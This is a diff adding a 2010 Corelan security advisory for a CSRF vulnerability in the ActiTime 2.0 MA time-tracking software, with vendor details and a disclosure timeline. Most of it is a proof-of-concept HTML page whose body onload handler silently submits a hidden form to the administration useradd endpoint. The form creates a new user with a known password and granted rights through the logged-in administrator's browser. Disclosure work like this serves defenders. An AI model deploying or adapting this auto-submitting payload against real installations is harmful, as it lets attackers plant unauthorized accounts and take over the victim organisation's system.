@@ -1,0 +1,162 @@
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+
+# Software      : Actitime 2.0-MA
+# Author          : Markot
+# Date             : July 16, 2010
+# Reference    : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-058
+# OS                : Windows
+# Tested on     : XP SP3 En (Virtual box)
+# Type of vuln : CSRF
+# Greetz to      : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+0x00 : Vulnerability information
+
+ Product : ActiTime
+
+ Version :  2.0 MA
+
+ Vendor :  http://www.actimind.com
+
+ URL :  http://www.actitime.com
+
+
+0x01 : Vendor description of software
+
+ From the vendor website:
+
+"Monitor personal time expenses in everyday work, do in-depth analysis of your staff's time-track, provide your customers
+
+with information on the completed work, specify time estimates for the tasks and then compare reported working time with
+
+estimates and more"
+
+
+0x02 : Vulnerability details
+
+ CSRF
+ The discovered vulnerability allows an attacker to send a type of malicious exploit crafted specifically for "ActiTime 2.0
+
+MA"  whereby the Administrator could be tricked into executing unauthorized commands or actions.
+
+0x03 : Proof of Concept
+
+<html>
+
+<body onload="document.forms['Login'].submit();">
+
+<form method="POST" name="Login" action="http://192.168.125.128:80/administration/useradd.do">
+<input type="hidden" name="submitted" value="1"/>
+<input type="hidden" name="formDataModified" value="true"/>
+<input type="hidden" name="redirectUrl" value=""/>
+<input type="hidden" name="afterReloginUrl" value=""/>
+<input type="hidden" name="beforeReloginUsername" value=""/>
+<input type="hidden" name="username" value="Markot"/>
+<input type="hidden" name="active" value="true"/>
+<input type="hidden" name="passwordText" value="corelan"/>
+<input type="hidden" name="passwordTextRetype" value="corelan"/>
+<input type="hidden" name="firstName" value="Markot"/>
+<input type="hidden" name="lastName" value="MarkotfromCorelan"/>
+<input type="hidden" name="middleName" value=""/>
+<input type="hidden" name="email" value="markot@corelan.be"/>
+<input type="hidden" name="phone" value=""/>
+<input type="hidden" name="fax" value=""/>
+<input type="hidden" name="mobile" value=""/>
+<input type="hidden" name="otherContact" value=""/>
+<input type="hidden" name="workdayDurationStr" value="8:00"/>
+<input type="hidden" name="overtimeTrackingLevel" value="0"/>
+<input type="hidden" name="hireDateStr" value="Jun 30, 2010"/>
+<input type="hidden" name="hireDateStrParsed" value="2010-05-30"/>
+<input type="hidden" name="releaseDateStr" value=""/>
+<input type="hidden" name="releaseDateStrParsed" value=""/>
+<input type="hidden" name="userRate[0].effectiveDateStr" value=""/>
+<input type="hidden" name="effectiveDate0" value=""/>
+<input type="hidden" name="regularRate0" value=""/>
+<input type="hidden" name="userRate[0].regularRateStr" value=""/>
+<input type="hidden" name="overtimeRate0" value=""/>
+<input type="hidden" name="userRate[0].overtimeRateStr" value=""/>
+<input type="hidden" name="userRate[0].leaveRateStr[1].rate" value=""/>
+<input type="hidden" name="userRate[0].leaveRateStr[2].rate" value=""/>
+<input type="hidden" name="userRate[0].leaveRateStr[3].rate" value=""/>
+<input type="hidden" name="userRate[0].rateMarkedToDelete" value="0"/>
+<input type="hidden" name="userRate[1].effectiveDateStr" value=""/>
+<input type="hidden" name="effectiveDate1" value=""/>
+<input type="hidden" name="regularRate1" value=""/>
+<input type="hidden" name="userRate[1].regularRateStr" value=""/>
+<input type="hidden" name="overtimeRate1" value=""/>
+<input type="hidden" name="userRate[1].overtimeRateStr" value=""/>
+<input type="hidden" name="userRate[1].leaveRateStr[1].rate" value=""/>
+<input type="hidden" name="userRate[1].leaveRateStr[2].rate" value=""/>
+<input type="hidden" name="userRate[1].leaveRateStr[3].rate" value=""/>
+<input type="hidden" name="userRate[1].rateMarkedToDelete" value="0"/>
+<input type="hidden" name="userRate[2].effectiveDateStr" value=""/>
+<input type="hidden" name="effectiveDate2" value=""/>
+<input type="hidden" name="regularRate2" value=""/>
+<input type="hidden" name="userRate[2].regularRateStr" value=""/>
+<input type="hidden" name="overtimeRate2" value=""/>
+<input type="hidden" name="userRate[2].overtimeRateStr" value=""/>
+<input type="hidden" name="userRate[2].leaveRateStr[1].rate" value=""/>
+<input type="hidden" name="userRate[2].leaveRateStr[2].rate" value=""/>
+<input type="hidden" name="userRate[2].leaveRateStr[3].rate" value=""/>
+<input type="hidden" name="userRate[2].rateMarkedToDelete" value="0"/>
+<input type="hidden" name="userRate[3].effectiveDateStr" value=""/>
+<input type="hidden" name="effectiveDate3" value=""/>
+<input type="hidden" name="regularRate3" value=""/>
+<input type="hidden" name="userRate[3].regularRateStr" value=""/>
+<input type="hidden" name="overtimeRate3" value=""/>
+<input type="hidden" name="userRate[3].overtimeRateStr" value=""/>
+<input type="hidden" name="userRate[3].leaveRateStr[1].rate" value=""/>
+<input type="hidden" name="userRate[3].leaveRateStr[2].rate" value=""/>
+<input type="hidden" name="userRate[3].leaveRateStr[3].rate" value=""/>
+<input type="hidden" name="userRate[3].rateMarkedToDelete" value="0"/>
+<input type="hidden" name="userRate[4].effectiveDateStr" value=""/>
+<input type="hidden" name="effectiveDate4" value=""/>
+<input type="hidden" name="regularRate4" value=""/>
+<input type="hidden" name="userRate[4].regularRateStr" value=""/>
+<input type="hidden" name="overtimeRate4" value=""/>
+<input type="hidden" name="userRate[4].overtimeRateStr" value=""/>
+<input type="hidden" name="userRate[4].leaveRateStr[1].rate" value=""/>
+<input type="hidden" name="userRate[4].leaveRateStr[2].rate" value=""/>
+<input type="hidden" name="userRate[4].leaveRateStr[3].rate" value=""/>
+<input type="hidden" name="userRate[4].rateMarkedToDelete" value="0"/>
+<input type="hidden" name="rightGranted[9]" value="on"/>
+<input type="hidden" name="rightGranted[5]" value="on"/>
+<input type="hidden" name="customersProjectsSelector.customerList" value=""/>
+<input type="hidden" name="customersProjectsSelector.projectList" value=""/>
+<input type="hidden" name="customersProjectsSelector.coarseSelection" value="specific"/>
+
+</form>
+</body>
+</html>
+
+
+
+0x04 : Author/Vendor communication
+
+July 4 2010 : Vendor contacted
+
+July 11 2010: reminder sent, no feedback received
+
+July 16 2010: public disclosure
+
+
+
+
+
+This transmission is intended only for use by the intended recipient(s).  If you are not an intended recipient you should not read, disclose, copy, circulate or in any other way use the information contained in this transmission.  The information contained in this transmission may be confidential and/or privileged.  If you have received this transmission in error, please notify the sender immediately and delete this transmission including any attachments.
